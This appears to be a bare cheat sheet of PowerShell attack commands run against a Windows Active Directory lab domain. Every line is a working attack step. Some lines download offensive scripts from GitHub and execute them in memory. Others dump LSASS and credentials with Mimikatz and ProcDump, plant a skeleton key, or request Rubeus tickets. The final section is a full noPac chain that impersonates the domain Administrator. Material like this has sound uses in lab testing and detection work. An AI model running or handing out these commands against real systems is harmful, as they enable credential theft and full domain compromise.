





IEX(IWR "https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1" -UseBasicParsing);

IEX(IWR "https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1" -UseBasicParsing);


Invoke-WebRequest -Uri https://download.sysinternals.com/files/Procdump.zip -OutFile ProcDump.zip
Expand-Archive -path ProcDump.zip

C:\Tools\Rubeus\Rubeus.exe asktgt /user:vagrant /password:vagrant /domain:windomain.local /dc:dc.windomain.local /nopac /nowrap

.\ProcDump\Procdump64.exe /accepteula -ma lsass.exe lsass.dmp


Invoke-Mimikatz -Command '"privilege::debug" "lsadump::trust /patch" exit'

Powershell -Exec Bypass -Command 'C:\Tools\Mimikatz\Mimikatz.exe "privilege::debug" "lsadump::trust /patch" exit'

Invoke-Mimikatz -DumpCreds

C:\Tools\Rubeus\Rubeus.exe asktgt /user:vagrant /password:vagrant /domain:windomain.local /dc:dc.windomain.local /nopac /nowrap

C:\Tools\Mimikatz\Mimikatz.exe lsadump::lsa /inject exit

C:\Tools\Mimikatz\Mimikatz.exe "privilege::debug" "misc::skeleton" exit

Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'




# Test exploitatbility nopac


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1")

New-MachineAccount -MachineAccount TestSPN -Password $(ConvertTo-SecureString -String "vagrant" -AsPlainText -Force) -Domain windomain.local -DomainController dc.windomain.local -Verbose

# Clear SPNs
Set-DomainObject "CN=TestSPN,CN=Computers,DC=windomain,DC=local" -Clear 'serviceprincipalname' -Domain windomain.local -DomainController dc.windomain.local -Verbose

# Change Machine Account samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "DC" -Attribute samaccountname -Domain windomain.local -DomainController dc.windomain.local -Verbose

# Request TGT
C:\Tools\Rubeus\Rubeus.exe asktgt /user:DC /password:vagrant /domain:windomain.local /dc:dc.windomain.local /nowrap

# Change Machine Account samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Domain windomain.local -DomainController dc.windomain.local -Verbose

# Request S4U2self
C:\Tools\Rubeus\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:dc.windomain.local /self /altservice:LDAP/DC.windomain.local /ptt /ticket:[TGT]

# Remove-MachineAccount -MachineAccount TestSPN  -Credential $(New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "WINDOMAIN\administrator", $(ConvertTo-SecureString -String "vagrant" -AsPlainText -Force))  -Domain windomain.local -DomainController dc.windomain.local -Verbose



[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-noPac.ps1')
Invoke-noPac -Command "scan -domain windomain.local -user vagrant -pass vagrant /enctype rc4"
Invoke-noPac -Command "-domain windomain.local -user vagrant -pass vagrant /enctype rc4 /dc dc.windomain.local /mAccount TestSPN1 /mPassword vagrant"